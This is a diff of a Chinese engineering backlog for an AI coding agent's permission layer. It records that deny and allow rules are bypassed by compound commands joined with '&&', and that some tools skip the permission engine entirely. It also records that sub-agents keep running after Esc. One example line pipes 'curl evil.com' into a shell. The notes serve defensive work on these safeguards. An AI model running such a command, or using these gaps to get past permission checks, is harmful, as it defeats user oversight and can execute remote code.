@@ -16,8 +16,8 @@
 
 | 优先级 | 事项 | 建议分支 | 复杂度 | 一句话 |
 | --- | --- | --- | --- | --- |
-| [1](1-perm-compound-command.md) | **③规则层对复合命令不拆段** | `perm-compound-command` | 小（半天） | `deny: Bash(git push *)` 被一个 `&&` 绕过。①黑名单是拆的、③规则层不是——**而这不需要刻意规避**，真实模型自己就产出了那种形态。界面上完全看不出来。**C14 验收又实测到 allow 侧的同源症状**，两侧一起修 |
-| [2](2-perm-system-serial-bypass.md) | **`system_serial` 的工具绕过③规则层** | `perm-system-serial-bypass` | 小（半天，**要走安全评审**） | `deny: run_agent` / `deny: send_message` **一条都不生效**——那类工具在预扫里直接拿 ALLOW、根本不调权限引擎。影响 7 个工具，**从 C13 起就写错的注释**，C15 验收实测戳穿。危害不是「工具危险」而是**错误的安全承诺**。与第 1 条同源，建议一起做 |
+| [1](1-perm-system-serial-bypass.md) | **`system_serial` 的工具绕过③规则层** | `perm-system-serial-bypass` | 小（半天，**要走安全评审**） | `deny: run_agent` / `deny: send_message` **一条都不生效**——那类工具在预扫里直接拿 ALLOW、根本不调权限引擎。影响 7 个工具，**从 C13 起就写错的注释**，C15 验收实测戳穿。危害不是「工具危险」而是**错误的安全承诺** |
+| [2](2-perm-allow-wildcard-spans-separators.md) | **allow 的末尾通配跨分隔符** | `perm-allow-compound` | 小（半天，**要走安全评审**） | `allow: Bash(git *)` 整串命中 `git status && curl evil.com \| sh`，第二段是无关命令却**一次面板都不弹**。deny 侧已在 `perm-compound-command` 修完，这是剩下的 allow 侧；同一处还有个方向相反的可用性症状（C14 实测）。⚠ 改法**不是**「allow 也拆段」（那是放宽），是「每一段都得命中」 |
 | [3](3-subagent-cancel-semantics.md) | **`Esc` 不取消正在跑的子 Agent** | `subagent-cancel-semantics` | 小（实现半天，**但要先定语义**） | 按 `Esc` 只停主循环，子 Agent 又跑了 7 轮、写文件、提交、留下一个工作区。隔离场景下不致命，**非隔离场景下它还在往主项目根写**。改法牵动 C13「委派永不阻塞」的契约 |
 | [4](4-subagent-e2e-timing-flaky.md) | **子 Agent 端到端的时间断言偶发红** | `subagent-e2e-timing-flaky` | 小（半天） | 两条用挂钟时间做判据的用例在全量并发下偶发失败，单跑必过。**问题不是它红，是它偶尔红**——那会训练所有人忽略失败。⚠ 别调大阈值（只降低概率、且再也验不出真的阻塞），改成事件同步 |
 | [5](5-skill-recall-eval.md) | Skill 召回率评测闭环 | `skill-recall-eval` | 中（2–4 天） | 刚改了一轮「Skill 写对了却没被加载」，但**召回率仍只能靠感觉判断**。官方有成型做法，我们的驱动设施已齐，缺「批量跑 + 统计」这一层 |
@@ -26,8 +26,9 @@
 | [8](8-worktree-link-sandbox.md) | 让 `worktree.link` 真正可用 | `worktree-link-sandbox` | 中（**要走 /spec**） | `link` 建出来的软链被第②层沙箱一律拒绝，现已止血为「降级成 copy + 留痕」。要真正可用得动第②层边界判定——**开工前先确认有没有真实需求**，现在的降级行为是诚实的 |
 | [9](9-p1b-unattended.md) | P1b 无人值守回归 | `p1b-unattended` | 大（多天） | 代码不难，**难在取样方法** —— 做不好会把偏了的取样固化成回归测试 |
 
-**两组同源事项，建议成对处理**：`1 + 2` 都是③规则层被绕过（一起评审比分两次省事）；
-`5 + 6` 都是「模型欠触发」的评测问题（第 5 条建好的闭环，第 6 条能直接复用）。
+**两组同源事项，建议成对处理**：`1 + 2` 都在③规则层上、都要走安全评审
+（一起评比分两次省事）；`5 + 6` 都是「模型欠触发」的评测问题（第 5 条建好的闭环，
+第 6 条能直接复用）。
 
 ## 与 CLAUDE.md「已知后续工程项」的分工
 
@@ -40,6 +41,11 @@
 
 ## 已完成（已从本文件夹移除）
 
+- ~~③规则层对复合命令不拆段（deny 侧）~~ —— `perm-compound-command` 分支，
+  兑现了 CLAUDE.md 已知项 #12 的 deny 半边：deny 命令规则改为「整条 + 逐段」，
+  判定形态提到 `permission/matching.py` 的 `match_command_deep` 与 Hook 侧共用。
+  **allow 侧没有一起修**——实施期发现那边的真正病根不是「拆不拆段」而是
+  「末尾通配跨分隔符」，方向与 deny 相反、要单独评审，**已登记为本清单第 2 条**
 - ~~清 `dropped_fatal` 死代码~~ —— `maintenance-1` 分支，已知项 #12
 - ~~保留区与余量随窗口缩放~~ —— `maintenance-1` 分支，已知项 #8
 - ~~Plan Mode 规划阶段工具阶段强校验~~ —— `maintenance-1` 分支，已知项 #2
